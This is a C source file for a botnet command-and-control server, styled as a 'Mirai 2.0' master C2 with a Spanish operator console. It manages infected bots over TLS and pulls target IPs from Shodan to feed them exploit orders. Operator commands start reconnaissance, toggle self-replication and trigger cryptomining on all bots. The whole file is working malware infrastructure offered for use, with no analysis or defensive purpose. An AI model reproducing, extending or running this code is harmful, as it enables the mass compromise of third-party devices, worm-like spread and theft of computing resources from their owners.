#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <pthread.h>
#include <json-c/json.h>
#include <time.h>
#include <curl/curl.h>
#include "config.h"
#include "ascii_art.h"

#define MAX_BOTS 500
#define MAX_SLAVES 50
#define MAX_REPORTS 100

// ANSI Colors
#define KNRM  "\x1B[0m"
#define KRED  "\x1B[31m"
#define KGRN  "\x1B[32m"
#define KYEL  "\x1B[33m"
#define KBLU  "\x1B[34m"
#define KMAG  "\x1B[35m"
#define KCYN  "\x1B[36m"

typedef struct {
    SSL *ssl;
    char ip[INET_ADDRSTRLEN];
    char id[64];
    char arch[32];
    char type[16]; // "higurashi", "vivi", "gamu", "slave_c2"
    char os[64];
    int active;
    int compromised_hosts;
    int auto_replicate;
    time_t last_seen;
} Bot;

typedef struct {
    char ip[INET_ADDRSTRLEN];
    int port;
    int active;
    int bot_count;
} SlaveC2;

typedef struct {
    char bot_id[64];
    char type[32];
    char data[256];
    time_t timestamp;
} Report;

Bot bots[MAX_BOTS];
SlaveC2 slaves[MAX_SLAVES];
Report reports[MAX_REPORTS];
int bot_count = 0;
int slave_count = 0;
int report_count = 0;
int total_compromised = 0;
int reports_received = 0;
pthread_mutex_t bots_mutex = PTHREAD_MUTEX_INITIALIZER;

// Shodan API integration
size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    char *data = (char *)userp;
    strncat(data, contents, realsize);
    return realsize;
}

void shodan_search(const char *query) {
    CURL *curl = curl_easy_init();
    if (!curl) return;
    
    char url[512];
    snprintf(url, sizeof(url),
        "https://api.shodan.io/shodan/host/search?key=YOUR_SHODAN_KEY&query=%s",
        query);
    
    char response[8192] = {0};
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);
    
    CURLcode res = curl_easy_perform(curl);
    if (res == CURLE_OK) {
        // Parse JSON response
        json_object *jobj = json_tokener_parse(response);
        if (jobj) {
            json_object *matches;
            if (json_object_object_get_ex(jobj, "matches", &matches)) {
                int len = json_object_array_length(matches);
                printf("\n%s[Shodan] Found %d results for: %s%s\n", KGRN, len, query, KNRM);
                
                // Send targets to available Higurashi bots
                for (int i = 0; i < len && i < 50; i++) {
                    json_object *match = json_object_array_get_idx(matches, i);
                    json_object *ip_obj;
                    if (json_object_object_get_ex(match, "ip_str", &ip_obj)) {
                        const char *target_ip = json_object_get_string(ip_obj);
                        
                        // Distribute to Higurashi bots
                        pthread_mutex_lock(&bots_mutex);
                        for (int j = 0; j < bot_count; j++) {
                            if (bots[j].active && strcmp(bots[j].type, "higurashi") == 0) {
                                json_object *cmd = json_object_new_object();
                                json_object_object_add(cmd, "action", json_object_new_string("exploit"));
                                json_object_object_add(cmd, "target", json_object_new_string(target_ip));
                                
                                const char *cmd_str = json_object_to_json_string(cmd);
                                SSL_write(bots[j].ssl, cmd_str, strlen(cmd_str));
                                json_object_put(cmd);
                                break;
                            }
                        }
                        pthread_mutex_unlock(&bots_mutex);
                    }
                }
            }
            json_object_put(jobj);
        }
    }
    curl_easy_cleanup(curl);
}

void display_dashboard() {
    printf("\033[2J\033[H");
    printf("\n%s", KCYN);
    printf("╔═══════════════════════════════════════════════════════════════════╗\n");
    printf("║       ✴✴ HIGURAMA MASTER C2 - MIRAI 2.0+++++ ✴✴                ║\n");
    printf("╚═══════════════════════════════════════════════════════════════════╝\n");
    printf("%s\n", KNRM);
    
    // Statistics
    int higurashi_count = 0, vivi_count = 0, slave_c2_count = 0;
    pthread_mutex_lock(&bots_mutex);
    for (int i = 0; i < bot_count; i++) {
        if (!bots[i].active) continue;
        if (strcmp(bots[i].type, "higurashi") == 0) higurashi_count++;
        else if (strcmp(bots[i].type, "vivi") == 0) vivi_count++;
        else if (strcmp(bots[i].type, "slave_c2") == 0) slave_c2_count++;
        total_compromised += bots[i].compromised_hosts;
    }
    pthread_mutex_unlock(&bots_mutex);
    
    printf("%sSTATISTICS:%s\n", KYEL, KNRM);
    printf("  Higurashi Soldiers: %s%d%s\n", KGRN, higurashi_count, KNRM);
    printf("  Vivi Extensions: %s%d%s\n", KMAG, vivi_count, KNRM);
    printf("  Slave C2s: %s%d%s\n", KCYN, slave_c2_count, KNRM);
    printf("  Total Compromised: %s%d%s\n", KRED, total_compromised, KNRM);
    printf("  Reports Received: %s%d%s\n", KNRM, reports_received, KNRM);
    printf("\n");
    
    // Active Bots
    printf("%s⚡ ACTIVE BOTS:%s\n", KRED, KNRM);
    pthread_mutex_lock(&bots_mutex);
    int displayed = 0;
    for (int i = 0; i < bot_count && displayed < 20; i++) {
        if (bots[i].active) {
            char type_color[8];
            if (strcmp(bots[i].type, "higurashi") == 0) strcpy(type_color, KGRN);
            else if (strcmp(bots[i].type, "vivi") == 0) strcpy(type_color, KMAG);
            else strcpy(type_color, KCYN);
            
            printf(" %s%d. [%s] %s [%s] - Hosts:%d%s\n",
                type_color, i + 1, bots[i].type, bots[i].id, bots[i].arch, 
                bots[i].compromised_hosts, KNRM);
            displayed++;
        }
    }
    pthread_mutex_unlock(&bots_mutex);
    printf("\n");
    
    // Recent Reports
    printf("%s📊 REPORTES RECIENTES:%s\n", KBLU, KNRM);
    if (report_count > 0) {
        int start = (report_count > 10) ? report_count - 10 : 0;
        for (int i = start; i < report_count; i++) {
            char time_str[64];
            struct tm *tm_info = localtime(&reports[i].timestamp);
            strftime(time_str, sizeof(time_str), "%H:%M:%S", tm_info);
            
            printf(" %s[%s]%s [%s%s%s] %s: %s%s%s\n",
                KYEL, time_str, KNRM,
                KGRN, reports[i].bot_id, KNRM,
                reports[i].type,
                KCYN, reports[i].data, KNRM);
        }
    } else {
        printf(" %s(sin reportes aún)%s\n", KYEL, KNRM);
    }
    printf("\n");
    
    // Commands
    printf("%s⚡ COMANDOS:%s\n", KMAG, KNRM);
    printf(" %slist%s              - Listar todos los bots\n", KYEL, KNRM);
    printf(" %srecon <num>%s       - Ordenar reconocimiento al bot #num\n", KYEL, KNRM);
    printf(" %srecon_all%s         - Reconocimiento masivo\n", KYEL, KNRM);
    printf(" %sauto_rep <bot> on/off%s - Toggle auto-replicación\n", KYEL, KNRM);
    printf(" %sexploit <bot> <ip>%s - Explotar objetivo específico\n", KYEL, KNRM);
    printf(" %sshodan <query>%s    - Buscar targets en Shodan\n", KYEL, KNRM);
    printf(" %sstatus <num>%s      - Status del bot #num\n", KYEL, KNRM);
    printf(" %smine_all%s          - Activar minería en todos\n", KYEL, KNRM);
    printf(" %sexit%s              - Salir\n", KYEL, KNRM);
    printf("\n%sComandante> %s", KRED, KNRM);
    fflush(stdout);
}

SSL_CTX *create_context() {
    const SSL_METHOD *method = TLS_server_method();
    SSL_CTX *ctx = SSL_CTX_new(method);
    if (!ctx) {
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }
    return ctx;
}

void configure_context(SSL_CTX *ctx) {
    if (SSL_CTX_use_certificate_file(ctx, "server.crt", SSL_FILETYPE_PEM) <= 0 ||
        SSL_CTX_use_PrivateKey_file(ctx, "server.key", SSL_FILETYPE_PEM) <= 0) {
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }
}

void *handle_bot(void *arg) {
    SSL *ssl = (SSL *)arg;
    
    int fd = SSL_get_fd(ssl);
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);
    getpeername(fd, (struct sockaddr*)&addr, &addr_len);
    char client_ip[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &addr.sin_addr, client_ip, sizeof(client_ip));
    
    pthread_mutex_lock(&bots_mutex);
    int current_bot_index = bot_count;
    bots[current_bot_index].ssl = ssl;
    strncpy(bots[current_bot_index].ip, client_ip, INET_ADDRSTRLEN - 1);
    bots[current_bot_index].ip[INET_ADDRSTRLEN - 1] = '\0';
    strcpy(bots[current_bot_index].id, "Unknown");
    strcpy(bots[current_bot_index].arch, "Unknown");
    strcpy(bots[current_bot_index].type, "unknown");
    bots[current_bot_index].active = 1;
    bots[current_bot_index].compromised_hosts = 0;
    bots[current_bot_index].auto_replicate = 1;
    bots[current_bot_index].last_seen = time(NULL);
    bot_count++;
    pthread_mutex_unlock(&bots_mutex);
    
    char buf[8192];
    while (1) {
        int bytes = SSL_read(ssl, buf, sizeof(buf) - 1);
        if (bytes > 0) {
            buf[bytes] = '\0';
            bots[current_bot_index].last_seen = time(NULL);
            
            // Log to file
            FILE *logfile = fopen("c2_logs.json", "a");
            if (logfile) {
                fprintf(logfile, "{\"timestamp\":%ld,\"bot\":\"%s\",\"data\":%s}\n",
                    time(NULL), bots[current_bot_index].id, buf);
                fclose(logfile);
            }
            
            json_object *jobj = json_tokener_parse(buf);
            if (jobj) {
                json_object *action_obj;
                if (json_object_object_get_ex(jobj, "action", &action_obj)) {
                    const char *action = json_object_get_string(action_obj);
                    
                    if (strcmp(action, "handshake") == 0) {
                        json_object *id_obj, *arch_obj, *type_obj, *os_obj;
                        
                        if (json_object_object_get_ex(jobj, "id", &id_obj)) {
                            strncpy(bots[current_bot_index].id, json_object_get_string(id_obj), 63);
                        }
                        if (json_object_object_get_ex(jobj, "arch", &arch_obj)) {
                            strncpy(bots[current_bot_index].arch, json_object_get_string(arch_obj), 31);
                        }
                        if (json_object_object_get_ex(jobj, "type", &type_obj)) {
                            strncpy(bots[current_bot_index].type, json_object_get_string(type_obj), 15);
                        }
                        if (json_object_object_get_ex(jobj, "os", &os_obj)) {
                            strncpy(bots[current_bot_index].os, json_object_get_string(os_obj), 63);
                        }
                        
                        // Check if it's a slave C2
                        if (strcmp(bots[current_bot_index].type, "slave_c2") == 0) {
                            if (slave_count < MAX_SLAVES) {
                                strncpy(slaves[slave_count].ip, client_ip, INET_ADDRSTRLEN - 1);
                                slaves[slave_count].port = C2_PORT;
                                slaves[slave_count].active = 1;
                                slaves[slave_count].bot_count = 0;
                                slave_count++;
                            }
                        }
                        
                        // Show replication animation for new higurashi bots
                        if (strcmp(bots[current_bot_index].type, "higurashi") == 0) {
                            show_replication_animation();
                        }
                        
                        display_dashboard();
                    } else if (strcmp(action, "report") == 0) {
                        json_object *type_obj, *data_obj;
                        if (json_object_object_get_ex(jobj, "type", &type_obj) &&
                            json_object_object_get_ex(jobj, "data", &data_obj)) {
                            
                            const char *report_type = json_object_get_string(type_obj);
                            const char *report_data = json_object_get_string(data_obj);
                            
                            // Store report
                            if (report_count < MAX_REPORTS) {
                                strncpy(reports[report_count].bot_id, bots[current_bot_index].id, sizeof(reports[report_count].bot_id) - 1);
                                strncpy(reports[report_count].type, report_type, sizeof(reports[report_count].type) - 1);
                                strncpy(reports[report_count].data, report_data, sizeof(reports[report_count].data) - 1);
                                reports[report_count].timestamp = time(NULL);
                                report_count++;
                            } else {
                                // Shift array if full (ring buffer)
                                memmove(&reports[0], &reports[1], sizeof(Report) * (MAX_REPORTS - 1));
                                strncpy(reports[MAX_REPORTS-1].bot_id, bots[current_bot_index].id, sizeof(reports[MAX_REPORTS-1].bot_id) - 1);
                                strncpy(reports[MAX_REPORTS-1].type, report_type, sizeof(reports[MAX_REPORTS-1].type) - 1);
                                strncpy(reports[MAX_REPORTS-1].data, report_data, sizeof(reports[MAX_REPORTS-1].data) - 1);
                                reports[MAX_REPORTS-1].timestamp = time(NULL);
                            }
                            
                            if (strcmp(report_type, "exploit") == 0) {
                                bots[current_bot_index].compromised_hosts++;
                            }
                            
                            reports_received++;
                        }
                        
                        display_dashboard();
                    }
                }
                json_object_put(jobj);
            }
        } else {
            break;
        }
    }
    
    bots[current_bot_index].active = 0;
    SSL_free(ssl);
    return NULL;
}

void *command_thread(void *arg) {
    (void)arg;
    char cmd_buffer[1024];
    
    while (1) {
        if (!fgets(cmd_buffer, sizeof(cmd_buffer), stdin)) break;
        cmd_buffer[strcspn(cmd_buffer, "\n")] = '\0';
        
        if (strlen(cmd_buffer) == 0) {
            display_dashboard();
            continue;
        }
        
        char *command = strtok(cmd_buffer, " ");
        if (!command) {
            display_dashboard();
            continue;
        }
        
        if (strcmp(command, "exit") == 0) {
            printf("Shutting down...\n");
            exit(0);
        } else if (strcmp(command, "list") == 0) {
            display_dashboard();
        } else if (strcmp(command, "recon_all") == 0) {
            pthread_mutex_lock(&bots_mutex);
            for (int i = 0; i < bot_count; i++) {
                if (bots[i].active && strcmp(bots[i].type, "higurashi") == 0) {
                    json_object *cmd = json_object_new_object();
                    json_object_object_add(cmd, "action", json_object_new_string("recon"));
                    const char *json_str = json_object_to_json_string(cmd);
                    SSL_write(bots[i].ssl, json_str, strlen(json_str));
                    json_object_put(cmd);
                }
            }
            pthread_mutex_unlock(&bots_mutex);
            display_dashboard();
        } else if (strcmp(command, "recon") == 0) {
            char *bot_num_str = strtok(NULL, " ");
            if (bot_num_str) {
                int bot_num = atoi(bot_num_str) - 1;
                if (bot_num >= 0 && bot_num < bot_count && bots[bot_num].active) {
                    json_object *cmd = json_object_new_object();
                    json_object_object_add(cmd, "action", json_object_new_string("recon"));
                    const char *json_str = json_object_to_json_string(cmd);
                    SSL_write(bots[bot_num].ssl, json_str, strlen(json_str));
                    json_object_put(cmd);
                }
            }
            display_dashboard();
        } else if (strcmp(command, "shodan") == 0) {
            char *query = strtok(NULL, "");
            if (query) {
                shodan_search(query);
            }
            display_dashboard();
        } else if (strcmp(command, "mine_all") == 0) {
            pthread_mutex_lock(&bots_mutex);
            for (int i = 0; i < bot_count; i++) {
                if (bots[i].active) {
                    json_object *cmd = json_object_new_object();
                    json_object_object_add(cmd, "action", json_object_new_string("mine"));
                    const char *json_str = json_object_to_json_string(cmd);
                    SSL_write(bots[i].ssl, json_str, strlen(json_str));
                    json_object_put(cmd);
                }
            }
            pthread_mutex_unlock(&bots_mutex);
            display_dashboard();
        } else if (strcmp(command, "exploit") == 0) {
            char *bot_num_str = strtok(NULL, " ");
            char *target_ip = strtok(NULL, " ");
            if (bot_num_str && target_ip) {
                int bot_num = atoi(bot_num_str) - 1;
                pthread_mutex_lock(&bots_mutex);
                if (bot_num >= 0 && bot_num < bot_count && bots[bot_num].active) {
                    json_object *cmd = json_object_new_object();
                    json_object_object_add(cmd, "action", json_object_new_string("exploit"));
                    json_object_object_add(cmd, "target", json_object_new_string(target_ip));
                    const char *json_str = json_object_to_json_string(cmd);
                    SSL_write(bots[bot_num].ssl, json_str, strlen(json_str));
                    json_object_put(cmd);
                    printf("%s[+] Bot #%d explotando %s%s\n", KGRN, bot_num + 1, target_ip, KNRM);
                } else {
                    printf("%s[-] Bot inválido%s\n", KRED, KNRM);
                }
                pthread_mutex_unlock(&bots_mutex);
            } else {
                printf("%s[-] Uso: exploit <bot_num> <target_ip>%s\n", KYEL, KNRM);
            }
            display_dashboard();
        } else if (strcmp(command, "auto_rep") == 0) {
            char *bot_num_str = strtok(NULL, " ");
            char *toggle = strtok(NULL, " ");
            if (bot_num_str && toggle) {
                int bot_num = atoi(bot_num_str) - 1;
                pthread_mutex_lock(&bots_mutex);
                if (bot_num >= 0 && bot_num < bot_count && bots[bot_num].active) {
                    int enable = (strcmp(toggle, "on") == 0) ? 1 : 0;
                    bots[bot_num].auto_replicate = enable;
                    json_object *cmd = json_object_new_object();
                    json_object_object_add(cmd, "action", json_object_new_string("auto_replicate"));
                    json_object_object_add(cmd, "enable", json_object_new_boolean(enable));
                    const char *json_str = json_object_to_json_string(cmd);
                    SSL_write(bots[bot_num].ssl, json_str, strlen(json_str));
                    json_object_put(cmd);
                    printf("%s[+] Auto-replicación %s para bot #%d%s\n", 
                        KGRN, enable ? "ACTIVADA" : "DESACTIVADA", bot_num + 1, KNRM);
                } else {
                    printf("%s[-] Bot inválido%s\n", KRED, KNRM);
                }
                pthread_mutex_unlock(&bots_mutex);
            } else {
                printf("%s[-] Uso: auto_rep <bot_num> on/off%s\n", KYEL, KNRM);
            }
            display_dashboard();
        } else if (strcmp(command, "status") == 0) {
            char *bot_num_str = strtok(NULL, " ");
            if (bot_num_str) {
                int bot_num = atoi(bot_num_str) - 1;
                pthread_mutex_lock(&bots_mutex);
                if (bot_num >= 0 && bot_num < bot_count && bots[bot_num].active) {
                    json_object *cmd = json_object_new_object();
                    json_object_object_add(cmd, "action", json_object_new_string("status"));
                    const char *json_str = json_object_to_json_string(cmd);
                    SSL_write(bots[bot_num].ssl, json_str, strlen(json_str));
                    json_object_put(cmd);
                } else {
                    printf("%s[-] Bot inválido%s\n", KRED, KNRM);
                }
                pthread_mutex_unlock(&bots_mutex);
            } else {
                printf("%s[-] Uso: status <bot_num>%s\n", KYEL, KNRM);
            }
            display_dashboard();
        } else {
            display_dashboard();
        }
    }
    return NULL;
}

int main() {
    SSL_library_init();
    OpenSSL_add_all_algorithms();
    SSL_load_error_strings();
    curl_global_init(CURL_GLOBAL_DEFAULT);
    
    SSL_CTX *ctx = create_context();
    configure_context(ctx);
    
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(C2_PORT);
    addr.sin_addr.s_addr = INADDR_ANY;
    
    bind(sock, (struct sockaddr*)&addr, sizeof(addr));
    listen(sock, 50);
    
    display_dashboard();
    
    pthread_t tid;
    pthread_create(&tid, NULL, command_thread, NULL);
    
    while (1) {
        struct sockaddr_in client_addr;
        socklen_t len = sizeof(client_addr);
        int client = accept(sock, (struct sockaddr*)&client_addr, &len);
        
        if (client >= 0) {
            SSL *ssl = SSL_new(ctx);
            SSL_set_fd(ssl, client);
            
            if (SSL_accept(ssl) > 0) {
                pthread_t bot_tid;
                pthread_create(&bot_tid, NULL, handle_bot, ssl);
                pthread_detach(bot_tid);
            } else {
                SSL_free(ssl);
                close(client);
            }
        }
    }
    
    close(sock);
    SSL_CTX_free(ctx);
    curl_global_cleanup();
    return 0;
}